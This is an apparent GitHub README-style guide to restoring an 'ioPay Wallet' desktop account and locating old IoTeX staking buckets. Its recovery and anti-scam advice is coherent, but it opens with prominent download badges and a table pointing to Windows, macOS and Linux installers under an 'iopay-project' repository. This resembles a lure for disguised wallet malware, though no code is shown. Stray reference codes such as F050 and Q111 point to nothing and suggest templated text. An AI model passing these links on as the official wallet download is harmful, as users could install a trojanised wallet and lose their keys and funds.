![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Recovering a Wallet and an Old Staking Position

Two things get called "recovery", and only one of them is possible without your key material:

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

- **Getting back into your account** - possible, from the phrase, the private key or the keystore file.
- **Getting back an account whose key material is gone** - not possible, by anyone.

This page covers the first, including the case where the account also holds a staking position you cannot see.

## Recovering on a new computer

1. **Install the current build** - v2.0.2, 19 November 2026. An older build may behave differently from this description.
2. **Choose import**, not create.
3. **Use the artifact you actually have** (F050):
   - 12- or 24-word **phrase** -> phrase import;
   - **private key** -> key import;
   - **keystore file** -> keystore import, with its password.
4. **Name the account.**
5. **Confirm both addresses** - `io1...` and `0x...` belong to the same account (F019); compare them with any record you have.
6. **Check balances and positions** before sending anything.

If you have more than one backup artifact and are not sure which is right, try the phrase first - it is the usual one for wallets created in this build.

## The old staking position

Q111 is the harder question, and it is usually a visibility problem rather than a loss.

**A staking position is not a balance.** It does not appear in the spendable total; it appears as a **bucket** with a validator, an amount and a duration (F021). So a restored account with a "missing" stake often has the stake right there, in a different panel.

**Check in this order:**

1. **The bucket list**, not the balance. One phrase can produce several buckets; the stake may be in a second one.
2. **The account.** A stake made from account A is invisible from account B, even under the same phrase.
3. **The address form.** Positions attach to the account, so both formats show the same position - but if you restored a *different* key, you are looking at a different account entirely.
4. **The app's freshness.** A view that cannot read the chain shows nothing. Refresh, and if timestamps are also wrong, it is connectivity, not loss.

**Once you can see it:** the position is still staked, and rewards keep accruing to it. Exiting is its own procedure, with its own timing - [how unstaking works](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iotex-unstaking-period-explained-for-iopay-users.md).

## If the position is genuinely gone

There is no mechanism to find a position by name, email or "old wallet". Positions are on-chain records attached to a key. Without that key's material, nobody - including whoever published this app - can reach them.

That is the honest end of this page, and it is why the backup article comes before the staking ones.

## What not to do

**Do not create a new wallet and assume it merged.** A new account is a new account; the old one is untouched and still holds whatever it held.

**Do not send a "recovery fee" to anyone.** No recovery service exists. A request for your phrase, or for payment to unlock a wallet, is the attack.

**Do not reuse an old install's files by copying the app folder.** Restore from the phrase instead; the account is on-chain, and copied local data is a corruption risk rather than a recovery path.

## After recovery

- **Test the backup** you just used, so you know it works before it matters again.
- **Write down any additional artifact** you have (key, keystore) and store it separately from the phrase.
- **Check staking parameters** before you re-stake anything - [the staking guide](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md).

## FAQ

**How do I get my wallet back on a new computer?**
Install the current build, import from your phrase, key or keystore, and confirm both addresses match.

**How do I get into an old wallet and an old staking position?**
Import the account that made the stake. The position appears as a bucket, not as a spendable balance.

**Can support recover an account without a phrase?**
No. There is no server-side key material to recover.

**Will my staking rewards still be there?**
Rewards accrued to the position and come out with it. What stops is new accrual once the unstaking countdown starts.

**What if I only have a keystore and forgot its password?**
There is no reset for a keystore password.

## Which artifact do you actually have?

The three artifacts are easy to confuse when you are anxious, and an import route expects the artifact it names. The shapes are distinctive:

- **A phrase** is words - 12 or 24 of them, in order, usually written down. If you are looking at a sentence, that is the phrase.
- **A private key** is one long hexadecimal string, with no spaces and no words in it.
- **A keystore** is a *file* - an encrypted JSON document - and it needs a password that is not the same as the app lock.

A phrase cannot be typed where a key is expected, and a keystore without its password is a locked box. If you have two of the three, use the one you can verify: the phrase, when it exists, proves itself by producing the address you expected.

## What a recovery does not bring back

The account comes back; the app around it does not. A new install starts clean: a new app lock, its own settings, and none of the local entries the old installation held - watch-only entries, tokens added to the view, interface preferences. None of that is on-chain, so none of it comes back, and none of it changes the balance.

Two things are worth redoing deliberately after a restore: the **app lock**, because a fresh install may start with none set, and a **second backup copy**, because the one you just used is now the only one.

## When the position still will not appear

If you have imported the account, confirmed both addresses, and the bucket list is still empty, the next question is which account the stake was made from. One phrase can produce several accounts, and a stake made from the second one is invisible from the first. Check the other accounts before concluding anything, and check the address on an explorer rather than only in the app - the explorer does not depend on the app's view being current.


---

*Import paths follow the v2.0.2 build; bucket and unstaking mechanics follow IoTeX documentation (F043).*
